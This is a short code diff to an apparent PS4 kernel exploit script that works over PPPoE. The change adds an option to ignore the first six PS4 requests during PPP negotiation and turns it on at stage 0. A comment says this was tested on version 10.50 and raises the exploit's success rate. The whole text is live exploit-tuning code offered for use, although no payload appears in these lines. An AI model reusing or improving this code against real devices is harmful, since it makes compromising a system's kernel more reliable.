@@ -259,7 +259,16 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
-    def ppp_negotation(self, cb=None):
+    def ppp_negotation(self, cb=None, ignore_initial_reqs=False):
+        if ignore_initial_reqs: # Ignore initial requests in order to increase the chances of the exploit working
+            num_reqs_to_ignore = 6 # Tested from 6 to 8 on version 10.50 - all give best results then not ignoring
+            num_ignored_reqs = 0
+            print('[*] Ignoring initial {} PS4 requests..'.format(num_reqs_to_ignore))
+            while num_ignored_reqs < num_reqs_to_ignore:
+                pkt = self.s.recv()
+                num_ignored_reqs+=1
+                print(num_ignored_reqs)
+            print('[*] Continuing...')
         print('[*] Waiting for PADI...')
         while True:
             pkt = self.s.recv()
@@ -609,7 +618,7 @@ class Exploit():
         print('')
         print('[+] STAGE 0: Initialization')
 
-        self.ppp_negotation(self.build_fake_ifnet)
+        self.ppp_negotation(self.build_fake_ifnet, True)
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
